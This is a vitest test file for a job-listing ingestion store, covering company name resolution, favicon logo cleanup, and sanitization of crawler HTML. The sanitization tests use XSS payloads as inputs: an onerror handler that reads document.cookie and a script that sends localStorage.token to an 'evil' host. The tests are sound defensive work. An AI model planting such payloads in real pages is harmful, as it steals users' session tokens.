import { describe, expect, it, vi } from "vitest";
import {
  planFaviconCleanup,
  SupabaseJobIntelligenceStore,
  toAdminUpsertPayload,
} from "./SupabaseJobIntelligenceStore";
import type { ServerSupabase } from "@/server/supabase";
import type { NormalizedJobPosting } from "../types";

// ── Module 11A: verifies the admin/crawler ingestion payload carries the
// caller-resolved canonical company identity (see src/server/company/identity.ts)
// without touching any of the pre-existing dedup-relevant fields
// (company_name, normalized_company). Pure function — no Supabase I/O.

function job(overrides: Partial<NormalizedJobPosting> = {}): NormalizedJobPosting {
  return {
    source: "greenhouse",
    sourceJobId: "job-1",
    companyName: "Freshdesk",
    role: "Backend Engineer",
    normalizedCompany: "freshdesk",
    normalizedRole: "backend engineer",
    normalizedLocation: null,
    fingerprint: "fp-1",
    parserVersion: "test-1",
    ...overrides,
  } as NormalizedJobPosting;
}

describe("toAdminUpsertPayload — Module 11A company identity fields", () => {
  it("attaches the resolved canonical name/key alongside the untouched raw company_name", () => {
    const payload = toAdminUpsertPayload(job({ companyName: "Freshdesk" }));
    expect(payload.company_name).toBe("Freshdesk"); // raw value, never rewritten
    expect(payload.company_canonical_name).toBe("Freshworks"); // curated alias resolution
    expect(payload.company_normalized_key).toBe("freshworks");
  });

  it("does not touch normalized_company (the cross-platform dedup grouping key)", () => {
    const payload = toAdminUpsertPayload(
      job({ companyName: "Freshdesk", normalizedCompany: "freshdesk" }),
    );
    expect(payload.normalized_company).toBe("freshdesk");
  });

  it("resolves the domain from companyUrl when present", () => {
    const payload = toAdminUpsertPayload(
      job({ companyName: "Acme", companyUrl: "https://www.acme.com/careers" }),
    );
    expect(payload.company_domain).toBe("acme.com");
  });

  it("has a null company_domain when no companyUrl is present", () => {
    const payload = toAdminUpsertPayload(job({ companyName: "Acme", companyUrl: null }));
    expect(payload.company_domain).toBeNull();
  });

  it("resolves distinct companies to distinct canonical keys (never over-merges)", () => {
    const infosys = toAdminUpsertPayload(job({ companyName: "Infosys" }));
    const infosysBpm = toAdminUpsertPayload(job({ companyName: "Infosys BPM" }));
    expect(infosys.company_normalized_key).not.toBe(infosysBpm.company_normalized_key);
  });

  it("still passes through company_logo_url as scraped, for the RPC's first-known-wins companies upsert", () => {
    const payload = toAdminUpsertPayload(
      job({ companyName: "Acme", companyLogoUrl: "https://cdn.test/acme.png" }),
    );
    expect(payload.company_logo_url).toBe("https://cdn.test/acme.png");
  });

  // ── Module 11C-1 ──
  it("sends the QUALIFIED displayName for a homonym entity, not the bare canonicalName — so a future crawl can never re-raise the companies_name_unique 23505", () => {
    const payload = toAdminUpsertPayload(
      job({
        companyName: "Slice",
        sourceUrl: "https://boards.greenhouse.io/slice",
        url: "https://slice.careers/careers-listing?gh_jid=1",
      }),
    );
    // company_canonical_name becomes companies.name via admin_upsert_global_job
    // (20260821000001's v_company_display_name) — companies_name_unique
    // constrains it globally, so this MUST be the qualified form.
    expect(payload.company_canonical_name).toBe("Slice (slice.careers)");
    expect(payload.company_normalized_key).toBe("slice#slice.careers");
    // The raw scraped company_name is untouched — postings still read "Slice".
    expect(payload.company_name).toBe("Slice");
  });

  it("sends the SAME displayName for an ordinary, non-homonym company as before (no behavior change)", () => {
    const payload = toAdminUpsertPayload(job({ companyName: "Freshdesk" }));
    expect(payload.company_canonical_name).toBe("Freshworks");
  });
});

// ── A1 stored-XSS fix: crawler-sourced description_html is sanitized at the
//    ingestion boundary, before it is ever sent to admin_upsert_global_job. ──
describe("toAdminUpsertPayload — description_html sanitization", () => {
  it("strips executable markup from crawler HTML (Greenhouse/Ashby feed raw `content`)", () => {
    const payload = toAdminUpsertPayload(
      job({
        descriptionHtml:
          '<p>Join us.</p><img src=x onerror="alert(document.cookie)">' +
          '<script>fetch("//evil?"+localStorage.token)</script>' +
          '<p onclick="x()">Perks</p>',
      }),
    );
    expect(payload.description_html).toBe("<p>Join us.</p><p>Perks</p>");
    const html = payload.description_html as string;
    expect(html).not.toMatch(/<\s*script/i);
    expect(html).not.toMatch(/onerror|onclick/i);
    expect(html).not.toContain("<img");
  });

  it("neutralises a javascript: link without dropping the visible text", () => {
    const payload = toAdminUpsertPayload(
      job({ descriptionHtml: '<p>Apply <a href="javascript:alert(1)">here</a></p>' }),
    );
    expect(payload.description_html).toBe("<p>Apply here</p>");
  });

  it("keeps legitimate structural formatting intact", () => {
    const clean =
      "<h2>About</h2><p>We build <strong>tools</strong>.</p><ul><li>Go</li><li>Rust</li></ul>";
    const payload = toAdminUpsertPayload(job({ descriptionHtml: clean }));
    expect(payload.description_html).toBe(clean);
  });

  it("passes through null when there is no HTML", () => {
    const payload = toAdminUpsertPayload(job({ descriptionHtml: null }));
    expect(payload.description_html).toBeNull();
  });

  it("collapses a payload that is nothing but a script to null (falls back to plain description)", () => {
    const payload = toAdminUpsertPayload(job({ descriptionHtml: "<script>alert(1)</script>" }));
    expect(payload.description_html).toBeNull();
  });
});

// ── 2026-09-13 fix: a domain-favicon logo (server/company/logo.ts) must never
// survive as an employer logo, whether by being retained when the crawler's
// own resolver finds nothing, or by permanently outranking a fresh, genuine
// resolution via admin_upsert_global_job's first-known-wins companies upsert. ──
describe("planFaviconCleanup — pure decision, no I/O", () => {
  const FAVICON = "https://www.google.com/s2/favicons?sz=128&domain=6sense.com";
  const GENUINE = "https://s101-recruiting.cdn.greenhouse.io/logos/6sense.png";
  const FRESH = "https://s101-recruiting.cdn.greenhouse.io/logos/6sense-new.png";

  it("1. a fresh source logo wins over a stale favicon", () => {
    const plan = planFaviconCleanup(FRESH, FAVICON);
    expect(plan.shouldOverwriteJob).toBe(true);
    expect(plan.replacementLogoUrl).toBe(FRESH);
  });

  it("2. an existing genuine logo is preserved when this run found nothing fresh", () => {
    const plan = planFaviconCleanup(null, GENUINE);
    expect(plan.shouldOverwriteJob).toBe(false);
    expect(plan.replacementLogoUrl).toBe(GENUINE);
  });

  it("2b. an existing genuine logo is preserved even when this run found something else fresh (first-known-wins is untouched for real logos)", () => {
    const plan = planFaviconCleanup(FRESH, GENUINE);
    expect(plan.shouldOverwriteJob).toBe(false);
    expect(plan.replacementLogoUrl).toBe(GENUINE);
  });

  it("3. a favicon-shaped value is never selected as the replacement, even defensively", () => {
    // Guards against a hypothetical future bug where a generic image leaks
    // past the resolver's own denylist and reaches this function as "fresh".
    const plan = planFaviconCleanup(FAVICON, FAVICON);
    expect(plan.shouldOverwriteJob).toBe(true);
    expect(plan.replacementLogoUrl).toBeNull();
  });

  it("4. a missing source logo clears a stale favicon to NULL, never leaves the favicon in place", () => {
    const plan = planFaviconCleanup(null, FAVICON);
    expect(plan.shouldOverwriteJob).toBe(true);
    expect(plan.replacementLogoUrl).toBeNull();
  });

  it("5. a generic ATS/vendor logo (not just a favicon) is treated the same way — same denylist", () => {
    const genericWorkable = "https://www.workable.com/assets/facebook-preview.png";
    const plan = planFaviconCleanup(FRESH, genericWorkable);
    expect(plan.shouldOverwriteJob).toBe(true);
    expect(plan.replacementLogoUrl).toBe(FRESH);
  });

  it("never touches a row with no stored logo at all", () => {
    const plan = planFaviconCleanup(FRESH, null);
    expect(plan.shouldOverwriteJob).toBe(false);
  });
});

describe("SupabaseJobIntelligenceStore.upsertCanonicalJob — favicon cleanup wiring", () => {
  const FAVICON = "https://www.google.com/s2/favicons?sz=128&domain=6sense.com";
  const FRESH = "https://s101-recruiting.cdn.greenhouse.io/logos/6sense-new.png";

  /** Minimal thenable/chainable fake matching exactly the calls this store makes. */
  function fakeSupabase(options: {
    globalJobsRow: { company_id: string | null; company_logo_url: string | null } | null;
  }) {
    const calls: Array<{
      table: string;
      op: "update";
      patch: Record<string, unknown>;
      eqs: [string, unknown][];
    }> = [];

    type ChainNode = {
      eq: (col: string, val: unknown) => ChainNode;
      maybeSingle: () => Promise<{ data: unknown; error: unknown }>;
      then: (resolve: (v: unknown) => void, reject?: (e: unknown) => void) => void;
    };

    function thenableEqChain(
      table: string,
      op: "select" | "update",
      patch: Record<string, unknown> | null,
      terminal: () => { data: unknown; error: unknown },
    ): ChainNode {
      const eqs: [string, unknown][] = [];
      const node: ChainNode = {
        eq: vi.fn((col: string, val: unknown) => {
          eqs.push([col, val]);
          return node;
        }),
        maybeSingle: vi.fn(async () => terminal()),
        then: (resolve, reject) => {
          if (op === "update" && patch) calls.push({ table, op: "update", patch, eqs: [...eqs] });
          Promise.resolve(terminal()).then(resolve, reject);
        },
      };
      return node;
    }

    const client = {
      rpc: vi.fn().mockResolvedValue({ data: { id: "job-1", created: false }, error: null }),
      from: vi.fn((table: string) => ({
        select: vi.fn(() =>
          thenableEqChain(table, "select", null, () => ({
            data: options.globalJobsRow,
            error: null,
          })),
        ),
        update: vi.fn((patch: Record<string, unknown>) =>
          thenableEqChain(table, "update", patch, () => ({ data: null, error: null })),
        ),
      })),
    };
    return { client, calls };
  }

  it("overwrites both global_jobs and companies when the stored logo is favicon-tainted", async () => {
    const { client, calls } = fakeSupabase({
      globalJobsRow: { company_id: "company-1", company_logo_url: FAVICON },
    });
    const store = new SupabaseJobIntelligenceStore(client as unknown as ServerSupabase);

    await store.upsertCanonicalJob(job({ companyLogoUrl: FRESH }), null);

    const jobUpdate = calls.find((c) => c.table === "global_jobs");
    expect(jobUpdate?.patch).toEqual({ company_logo_url: FRESH });
    expect(jobUpdate?.eqs).toEqual([["id", "job-1"]]);

    const companyUpdate = calls.find((c) => c.table === "companies");
    expect(companyUpdate?.patch).toEqual({ logo_url: FRESH, logo_source: "job_scraped" });
    expect(companyUpdate?.eqs).toEqual([
      ["id", "company-1"],
      ["logo_source", "domain_favicon"],
    ]);
  });

  it("issues NO update at all when the stored logo is already genuine", async () => {
    const { client, calls } = fakeSupabase({
      globalJobsRow: { company_id: "company-1", company_logo_url: "https://cdn.real/logo.png" },
    });
    const store = new SupabaseJobIntelligenceStore(client as unknown as ServerSupabase);

    await store.upsertCanonicalJob(job({ companyLogoUrl: null }), null);

    expect(calls).toHaveLength(0);
  });

  it("clears to NULL (not left favicon-tainted) when this run's resolver found nothing", async () => {
    const { client, calls } = fakeSupabase({
      globalJobsRow: { company_id: "company-1", company_logo_url: FAVICON },
    });
    const store = new SupabaseJobIntelligenceStore(client as unknown as ServerSupabase);

    await store.upsertCanonicalJob(job({ companyLogoUrl: null }), null);

    const jobUpdate = calls.find((c) => c.table === "global_jobs");
    expect(jobUpdate?.patch).toEqual({ company_logo_url: null });
    const companyUpdate = calls.find((c) => c.table === "companies");
    expect(companyUpdate?.patch).toEqual({ logo_url: null, logo_source: null });
  });

  it("never fails the upsert itself if the cleanup read-back errors", async () => {
    const client = {
      rpc: vi.fn().mockResolvedValue({ data: { id: "job-1", created: true }, error: null }),
      from: vi.fn(() => ({
        select: vi.fn(() => ({
          eq: vi.fn(() => ({
            maybeSingle: vi.fn(async () => ({ data: null, error: new Error("boom") })),
          })),
        })),
        update: vi.fn(),
      })),
    };
    const store = new SupabaseJobIntelligenceStore(client as unknown as ServerSupabase);
    const outcome = await store.upsertCanonicalJob(job({ companyLogoUrl: FRESH }), null);
    expect(outcome).toEqual({ jobId: "job-1", created: true });
  });
});
